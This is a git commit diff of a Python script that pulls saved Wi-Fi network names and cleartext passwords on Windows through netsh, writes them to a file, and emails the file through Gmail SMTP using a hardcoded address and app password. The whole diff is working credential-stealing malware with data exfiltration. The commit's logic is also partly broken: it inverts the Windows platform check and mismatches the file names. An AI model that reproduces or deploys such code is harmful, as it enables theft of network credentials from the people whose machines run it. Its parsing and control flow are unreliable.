ab4a3b51d1ce360477504c240b3517b585b03130
Vinícius Bruno <91799009+Vinnybrunn00@users.noreply.github.com>
2023-05-01 21:10:53 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,40 +1,38 @@
 from email.mime.base import MIMEBase
 from email import encoders
 from email.mime.multipart import MIMEMultipart
-import smtplib, ssl
+import smtplib, ssl, sys
 import subprocess as sp
 
 msg = MIMEMultipart()
 
 def Get_Wifi_Password():
-    redes_wifi = sp.check_output(
-        ["netsh", "wlan", "show", "profiles"], encoding='cp860'
-        )
-    for redes in redes_wifi.split('\n'):
-        if "Todos os Perfis de Usuários:" in redes:
-            pos = redes.find(':')
-            qq = redes[pos+2:]
-            senhas = sp.check_output(
-                ["netsh", "wlan", "show", "profiles", qq, "key", "=", "clear" ], encoding='cp860'
+    get_wifi = sp.check_output(
+        ['netsh', 'wlan', 'show', 'profiles'], encoding='cp860'
+    )
+    for network in get_wifi.split('\n'):
+        if 'Todos os Perfis de Usuário' in network:
+            two_point = network.find(':')
+            info_network = network[two_point+2:]
+            all_networks = sp.check_output(
+                ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
                 )
-            for password in senhas.split('\n'):
-                if 'Nome SSID' in password:
-                    point1 = password.find(':')
-                    nome = password[point1+2:]
+            for passwords in all_networks.split('\n'):
+                if 'Nome SSID' in passwords:
+                    names = passwords[two_point+2:]
                 else:
                     return 'Name SSID not found!'
-
-                if 'Conteúdo da Chave' in password:
-                    point = password.find(':')
-                    senha_ = password[point+2:]
-                    info_rede = f'Rede: {nome}\nSenha: {senha_}\n'
-                    with open('senhas.txt', 'a') as wifi:
-                        wifi.write(f'{info_rede}\n')
+                
+                if 'Conteúdo da Chave' in passwords:
+                    passwd = passwords[two_point+2:]
+                    get_network = f'Network: {names}\nSenha: {passwd}\n\n'
+                    with open('passwords.txt', 'a') as wifi:
+                        wifi.write(f'{get_network}')
                     wifi.close()
                 else:
                     return 'Content Key not found!'
-            else:
-                return 'Name list not found!'
+        else:
+            return 'Name list not found!'
 
 def Send_Email():
     ADDR = 'xablau.mpx@gmail.com'
@@ -47,9 +45,12 @@ def Send_Email():
         att = MIMEBase('application', 'octet-stream')
         att.set_payload(file.read())
         encoders.encode_base64(att)
-        att.add_header('Content-Disposition', 'attachment; filename=senhas.txt')
+        att.add_header(
+            'Content-Disposition', 'attachment; filename=senhas.txt'
+        )
         file.close()
         msg.attach(att)
+
     except Exception as error:
         return error
     
@@ -60,10 +61,13 @@ def Send_Email():
             smtp.login(msg['From'], 'vrrqjavicmysbflk')
             smtp.sendmail(msg['From'], msg['To'], msg.as_string())
             return 'Email Send Sucess'
+        
         except Exception as err:
             return err
-
+        
 if __name__ == '__main__':
-    Get_Wifi_Password()
-    Send_Email()
-
+    if not sys.platform == 'win32':
+        Get_Wifi_Password()
+        Send_Email()
+    else:
+        print('System Not Compatible')
